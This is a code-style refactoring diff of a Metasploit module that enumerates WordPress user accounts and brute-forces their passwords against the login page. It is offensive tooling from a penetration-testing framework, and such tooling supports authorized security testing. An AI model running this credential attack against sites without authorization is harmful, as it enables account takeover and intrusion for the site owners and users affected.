@@ -10,24 +10,21 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
 
-
   def initialize
     super(
-      'Name'          => 'WordPress Brute Force and User Enumeration Utility',
-      'Description'   => 'WordPress Authentication Brute Force and User Enumeration Utility',
-      'Author'        =>
-        [
-          'Tiago Ferreira <tiago.ccna[at]gmail.com>',
-          'Zach Grace <zgrace[at]404labs.com>',
-          'Christian Mehlmauer'
-        ],
-      'References'     =>
-        [
-          ['BID', '35581'],
-          ['CVE', '2009-2335'],
-          ['OSVDB', '55713']
-        ],
-      'License'        =>  MSF_LICENSE
+      'Name' => 'WordPress Brute Force and User Enumeration Utility',
+      'Description' => 'WordPress Authentication Brute Force and User Enumeration Utility',
+      'Author' => [
+        'Tiago Ferreira <tiago.ccna[at]gmail.com>',
+        'Zach Grace <zgrace[at]404labs.com>',
+        'Christian Mehlmauer'
+      ],
+      'References' => [
+        ['BID', '35581'],
+        ['CVE', '2009-2335'],
+        ['OSVDB', '55713']
+      ],
+      'License' => MSF_LICENSE
     )
 
     register_options(
@@ -37,12 +34,11 @@ class MetasploitModule < Msf::Auxiliary
         OptBool.new('ENUMERATE_USERNAMES', [ true, 'Enumerate usernames', true ]),
         OptInt.new('RANGE_START', [false, 'First user id to enumerate', 1]),
         OptInt.new('RANGE_END', [false, 'Last user id to enumerate', 10])
-    ])
-
+      ]
+    )
   end
 
-  def run_host(ip)
-
+  def run_host(_ip)
     unless wordpress_and_online?
       print_error("#{target_uri} does not seem to be WordPress site")
       return
@@ -60,34 +56,32 @@ class MetasploitModule < Msf::Auxiliary
     if datastore['VALIDATE_USERS']
       @users_found = {}
       vprint_status("#{target_uri} - WordPress User-Validation - Running User Validation")
-      each_user_pass { |user, pass|
+      each_user_pass do |user, _pass|
         validate_user(user)
-      }
+      end
 
       unless @users_found.empty?
-        print_good("#{target_uri} - WordPress User-Validation - Found #{uf = @users_found.keys.size} valid #{uf == 1 ? "user" : "users"}")
+        print_good("#{target_uri} - WordPress User-Validation - Found #{uf = @users_found.keys.size} valid #{uf == 1 ? 'user' : 'users'}")
       end
     end
 
     if datastore['BRUTEFORCE']
       vprint_status("#{target_uri} - WordPress Brute Force - Running Bruteforce")
-      if datastore['VALIDATE_USERS']
-        if @users_found && @users_found.keys.size > 0
-          vprint_status("#{target_uri} - WordPress Brute Force - Skipping all but #{uf = @users_found.keys.size} valid #{uf == 1 ? "user" : "users"}")
-        end
+      if datastore['VALIDATE_USERS'] && (@users_found && !@users_found.keys.empty?)
+        vprint_status("#{target_uri} - WordPress Brute Force - Skipping all but #{uf = @users_found.keys.size} valid #{uf == 1 ? 'user' : 'users'}")
       end
 
       # Brute-force using files.
-      each_user_pass { |user, pass|
-        if datastore['VALIDATE_USERS']
-          next unless @users_found[user]
+      each_user_pass do |user, pass|
+        if datastore['VALIDATE_USERS'] && !(@users_found[user])
+          next
         end
 
         do_login(user, pass)
-      }
+      end
 
       # Brute force previously found users
-      if not usernames.empty?
+      if !usernames.empty?
         print_status("#{target_uri} - Brute-forcing previously found accounts...")
         passwords = load_password_vars
         usernames.each do |user|
@@ -100,14 +94,14 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-  def validate_user(user=nil)
+  def validate_user(user = nil)
     print_status("#{target_uri} - WordPress User-Validation - Checking Username:'#{user}'")
 
     exists = wordpress_user_exists?(user)
     if exists
       print_good("#{target_uri} - WordPress User-Validation - Username: '#{user}' - is VALID")
       connection_details = {
-        module_fullname: self.fullname,
+        module_fullname: fullname,
         username: user,
         workspace_id: myworkspace_id,
         status: Metasploit::Model::Login::Status::UNTRIED
@@ -122,8 +116,7 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-
-  def do_login(user=nil, pass=nil)
+  def do_login(user = nil, pass = nil)
     vprint_status("#{target_uri} - WordPress Brute Force - Trying username:'#{user}' with password:'#{pass}'")
 
     cookie = wordpress_login(user, pass)
@@ -145,12 +138,12 @@ class MetasploitModule < Msf::Auxiliary
     for i in datastore['RANGE_START']..datastore['RANGE_END']
       username = wordpress_userid_exists?(i)
       if username
-        print_good "#{target_uri} - Found user '#{username}' with id #{i.to_s}"
+        print_good "#{target_uri} - Found user '#{username}' with id #{i}"
         usernames << username
       end
     end
 
-    if not usernames.empty?
+    if !usernames.empty?
       p = store_loot('wordpress.users', 'text/plain', rhost, usernames * "\n", "#{rhost}_wordpress_users.txt")
       print_good("#{target_uri} - Usernames stored in: #{p}")
     end
